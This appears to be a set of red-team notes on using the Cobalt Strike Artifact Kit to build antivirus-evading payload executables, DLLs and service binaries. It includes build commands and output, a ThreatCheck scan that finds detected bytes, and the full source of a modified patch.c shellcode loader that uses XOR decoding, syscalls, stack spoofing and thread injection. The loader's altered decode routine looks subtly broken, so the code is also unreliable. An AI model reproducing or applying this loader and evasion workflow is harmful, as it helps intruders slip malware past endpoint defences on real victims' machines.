# Artifact Kit

- Get threats Windows Defender has detected on the computer (check Resources value: file = disk)

```
PS C:\> Get-MpThreatDetection | sort $_.InitialDetectionTime | select -First 1
```

- Show the usage of build.sh

```
ubuntu@james /m/c/T/c/a/k/artifact> ./build.sh
[Artifact kit] [-] Usage:
[Artifact kit] [-] ./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
[Artifact kit] [-]  - Techniques       - a space separated list
[Artifact kit] [-]  - Allocator        - set how to allocate memory for the reflective loader.
[Artifact kit] [-]                       Valid values [HeapAlloc VirtualAlloc MapViewOfFile]
[Artifact kit] [-]  - Stage Size       - integer used to set the space needed for the beacon stage.
[Artifact kit] [-]                       For a 0K   RDLL stage size should be 310272 or larger
[Artifact kit] [-]                       For a 5K   RDLL stage size should be 310272 or larger
[Artifact kit] [-]                       For a 100K RDLL stage size should be 444928 or larger
[Artifact kit] [-]  - RDLL Size        - integer used to specify the RDLL size. Valid values [0, 5, 100]
[Artifact kit] [-]  - Resource File    - true or false to include the resource file
[Artifact kit] [-]  - Stack Spoof      - true or false to use the stack spoofing technique
[Artifact kit] [-]  - Syscalls         - set the system call method
[Artifact kit] [-]                       Valid values [none embedded indirect indirect_randomized]
[Artifact kit] [-]  - Output Directory - Destination directory to save the output
[Artifact kit] [-] Example:
[Artifact kit] [-]   ./build.sh "peek pipe readfile" HeapAlloc 310272 5 true true indirect /tmp/dist/artifact
```

- Use the Artifact Kit to build a new set of artifact templates using the bypass-pipe technique

```
ubuntu@james /m/c/T/c/a/k/artifact> ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'
```

*Each artifact flavour will be compiled to /mnt/c/Tools/cobaltstrike/artifacts/pipe/, along with an aggressor script, artifact.cna.*

```
ubuntu@james /m/c/T/c/a/k/artifact> ls -l /mnt/c/Tools/cobaltstrike/artifacts/pipe/
total 2044
-rwxrwxrwx 1 ubuntu ubuntu  11914 Nov  6 14:56 artifact.cna*
-rwxrwxrwx 1 ubuntu ubuntu  14336 Nov  6 14:55 artifact32.dll*
-rwxrwxrwx 1 ubuntu ubuntu  14848 Nov  6 14:55 artifact32.exe*
-rwxrwxrwx 1 ubuntu ubuntu 323584 Nov  6 14:55 artifact32big.dll*
-rwxrwxrwx 1 ubuntu ubuntu 324096 Nov  6 14:55 artifact32big.exe*
-rwxrwxrwx 1 ubuntu ubuntu  15360 Nov  6 14:55 artifact32svc.exe*
-rwxrwxrwx 1 ubuntu ubuntu 324608 Nov  6 14:55 artifact32svcbig.exe*
-rwxrwxrwx 1 ubuntu ubuntu  19456 Nov  6 14:56 artifact64.exe*
-rwxrwxrwx 1 ubuntu ubuntu  18432 Nov  6 14:55 artifact64.x64.dll*
-rwxrwxrwx 1 ubuntu ubuntu 328704 Nov  6 14:56 artifact64big.exe*
-rwxrwxrwx 1 ubuntu ubuntu 327680 Nov  6 14:56 artifact64big.x64.dll*
-rwxrwxrwx 1 ubuntu ubuntu  20480 Nov  6 14:56 artifact64svc.exe*
-rwxrwxrwx 1 ubuntu ubuntu 329728 Nov  6 14:56 artifact64svcbig.exe*
```

- *'32/64' denotes 32 and 64bit architectures.*
- *'big' denotes that it's stageless.*
- *'svc' denotes that it's a service executable.*

- Scan a Windows Service EXE with ThreatCheck

```
PS C:\Users\james> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
[+] Target file size: 329728 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0xBEC
00000000   B9 06 00 00 00 4C 89 E7  4C 8D 05 05 E9 04 00 F3   1····L?çL?··é··ó
00000010   AB 4C 89 E9 C7 84 24 88  00 00 00 68 00 00 00 FF   «L?éÇ?$?···h···ÿ
00000020   15 57 2D 05 00 45 31 C9  45 31 C0 31 C9 4C 89 64   ·W-··E1ÉE1A1ÉL?d
00000030   24 48 4C 89 EA 48 89 6C  24 40 48 C7 44 24 38 00   $HL?êH?l$@HÇD$8·
00000040   00 00 00 48 C7 44 24 30  00 00 00 00 C7 44 24 28   ···HÇD$0····ÇD$(
00000050   04 00 00 00 C7 44 24 20  01 00 00 00 FF 15 8A 2B   ····ÇD$ ····ÿ·?+
00000060   05 00 85 C0 74 32 48 8B  4C 24 70 48 85 C9 74 28   ··?At2H?L$pH?Ét(
00000070   0F 10 44 24 70 48 8D 54  24 50 4C 63 CE 49 89 D8   ··D$pH?T$PLcII?O
00000080   48 8B 84 24 80 00 00 00  0F 11 44 24 50 48 89 44   H??$?·····D$PH?D
00000090   24 60 E8 6E FE FF FF 90  48 81 C4 F8 04 00 00 5B   $`èn_ÿÿ?H?Äo···[
000000A0   5E 5F 5D 41 5C 41 5D C3  57 56 48 83 EC 68 48 8D   ^_]A\A]AWVH?ìhH?
000000B0   35 62 E8 04 00 31 C0 49  89 C9 48 8D 7C 24 20 B9   5bè··1AI?ÉH?|$ 1
000000C0   10 00 00 00 41 89 D2 F3  A5 4C 89 C2 4C 8D 44 24   ····A?Oó¥L?AL?D$
000000D0   20 48 89 C1 83 E1 07 8A  0C 0A 41 30 0C 00 48 FF    H?A?á·?··A0··Hÿ
000000E0   C0 48 83 F8 40 75 EA 31  C0 41 39 C2 7E 12 48 89   AH?o@uê1AA9A~·H?
000000F0   C1 83 E1 07 8A 0C 0A 41  30 0C 01 48 FF C0 EB E9   A?á·?··A0··HÿAëé
```

*IDA and Ghidra can help here because it allows you to dissect the file.*

*This methodology should always get you through.  Each artifact type will also likely have different signatures used to detect them that you'll need to work through.*

*Load the aggressor script.  Go to Cobalt Strike > Script Manager > Load and select the artifact.cna file in your output directory.  Any DLL and EXE payloads that you generate from hereon will use those new artifacts, so use Payloads > Windows Stageless Generate All Payloads to replace all of your payloads in C:\Payloads.*

*Strongly advised to delete the existing payloads first because they sometimes only get partially overwritten with the new ones.*

- Patch.c

```
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2023 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
   phear * payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
      return;

   void * gpa_addr = (void *)GetProcAddress;
   void * gmh_addr = (void *)GetModuleHandleA;

   memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
   memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"
void spawn(void * buffer, int length, char * key) {
   char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
   int x;

   /* decode the process name with the key (valid name, \0, junk to fill 64) */
   for (int x = 0; x < sizeof(process); x++) {
      *((char *)process + x) = *((char *)process + x) ^ key[x % 8]; // 8 byte XoR;
   }

   /* decode the payload with the key */
   for (x = 0; x < length; x++) {
    char* ptr = (char *)buffer + x;

    /* do something random */
    GetTickCount();

    *ptr = *ptr ^ key[x % 8];
}

   /* propagate our key function pointers to our payload */
   set_key_pointers(buffer);

   inject(buffer, length, process);
}
#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void * buffer) {
   void (*function)();
   function = (void (*)())buffer;
#if STACK_SPOOF == 1
   beacon_threadid = GetCurrentThreadId();
#endif
   function();
}

void spawn(void * buffer, int length, char * key) {
   void * ptr = NULL;

   /* This memory allocation will be released by beacon for these conditions:.
    *    1. The stage.cleanup is set to true
    *    2. The reflective loader passes the address of the loader into DllMain.
    *
    * This is true for the built-in Cobalt Strike reflective loader and the example
    * user defined reflective loader (UDRL) in the Arsenal Kit.
    */
#if USE_HeapAlloc
   /* Create Heap */
   HANDLE heap;
   heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

   /* allocate the memory for our decoded payload */
   ptr = HeapAlloc(heap, 0, 10);

   /* Get wacky and add a bit of of HeapReAlloc */
   if (length > 0) {
      ptr = HeapReAlloc(heap, 0, ptr, length);
   }

#elif USE_VirtualAlloc
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#else
   ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

#elif USE_MapViewOfFile
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   HANDLE hFile = create_file_mapping(0, length);
   ptr = map_view_of_file(hFile);
   NtClose(hFile);
#else
   HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
   ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
   CloseHandle(hFile);
#endif
#endif

    /* decode the payload with the key */
    int x;  // Declare x outside the loop

    for (x = 0; x < length; x++) {
    // Obfuscated XOR operation
        *((char *)buffer + x) = (*((char *)buffer + x) ^ key[x % 8] ^ (x << 2)) | (x >> 1);
    }

#if STACK_SPOOF == 1
   /* setup stack spoofing */
   set_stack_spoof_code();
#endif

   /* propagate our key function pointers to our payload */
   set_key_pointers(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
   /* fix memory protection */
   DWORD old;
#if USE_SYSCALLS == 1
   NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
   VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif
#endif

   /* spawn a thread with our data */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif
```
